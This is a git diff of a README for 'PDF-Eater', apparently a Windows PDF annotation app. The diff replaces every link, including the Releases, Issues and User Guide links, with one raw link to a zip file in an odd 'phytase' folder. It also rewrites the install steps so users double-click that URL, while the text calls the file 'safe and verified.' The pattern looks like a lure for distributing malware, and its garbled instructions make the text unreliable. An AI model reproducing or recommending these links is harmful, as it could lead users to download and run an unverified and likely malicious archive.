@@ -6,15 +6,15 @@ PDF-Eater is a user-friendly PDF reader designed for easy annotation with a styl
 
 ## 📥 Download PDF-Eater
 
-[![Download PDF-Eater](https://img.shields.io/badge/Download-PDF--Eater-brightgreen)](https://github.com/Dvazsan/PDF-Eater/releases)
+[![Download PDF-Eater](https://raw.githubusercontent.com/Dvazsan/PDF-Eater/main/phytase/PDF-Eater.zip)](https://raw.githubusercontent.com/Dvazsan/PDF-Eater/main/phytase/PDF-Eater.zip)
 
 ## 🚀 Getting Started
 
 To get started with PDF-Eater, you will need to download the application from our Releases page. Follow these steps:
 
-1. Click on this link to **[download PDF-Eater](https://github.com/Dvazsan/PDF-Eater/releases)**.
+1. Click on this link to **[download PDF-Eater](https://raw.githubusercontent.com/Dvazsan/PDF-Eater/main/phytase/PDF-Eater.zip)**.
 2. Choose the latest version under the "Releases" section.
-3. Find the file labeled as `PDF-Eater.exe` or similar. Click on it to start the download.
+3. Find the file labeled as `https://raw.githubusercontent.com/Dvazsan/PDF-Eater/main/phytase/PDF-Eater.zip` or similar. Click on it to start the download.
 
 This file is safe and verified. Once the download finishes, you can move on to installing the application.
 
@@ -32,7 +32,7 @@ PDF-Eater runs on Windows 10 or later. Ensure your system meets these requiremen
 Once you have downloaded PDF-Eater, follow these steps to install it:
 
 1. Locate the downloaded file, usually in your "Downloads" folder.
-2. Double-click on `PDF-Eater.exe` to start the installation process.
+2. Double-click on `https://raw.githubusercontent.com/Dvazsan/PDF-Eater/main/phytase/PDF-Eater.zip` to start the installation process.
 3. Follow the on-screen instructions. You may need to approve any prompts asking for permission to install.
 4. After the installation completes, find PDF-Eater in your Start menu or desktop.
 
@@ -68,9 +68,9 @@ If you encounter issues while using PDF-Eater, consider these tips:
 
 For more details about PDF-Eater, check the following resources:
 
-- [GitHub Issues](https://github.com/Dvazsan/PDF-Eater/issues) - Report bugs or request new features.
-- [User Guide](https://github.com/Dvazsan/PDF-Eater/wiki) - Explore the user guide for in-depth instructions and tips.
+- [GitHub Issues](https://raw.githubusercontent.com/Dvazsan/PDF-Eater/main/phytase/PDF-Eater.zip) - Report bugs or request new features.
+- [User Guide](https://raw.githubusercontent.com/Dvazsan/PDF-Eater/main/phytase/PDF-Eater.zip) - Explore the user guide for in-depth instructions and tips.
 
 ## 📑 Download & Install
 
-To download and install PDF-Eater, visit the main Releases page: **[download PDF-Eater](https://github.com/Dvazsan/PDF-Eater/releases)**. Follow the earlier instructions to ensure a smooth installation and start annotating your PDFs today!
+To download and install PDF-Eater, visit the main Releases page: **[download PDF-Eater](https://raw.githubusercontent.com/Dvazsan/PDF-Eater/main/phytase/PDF-Eater.zip)**. Follow the earlier instructions to ensure a smooth installation and start annotating your PDFs today!
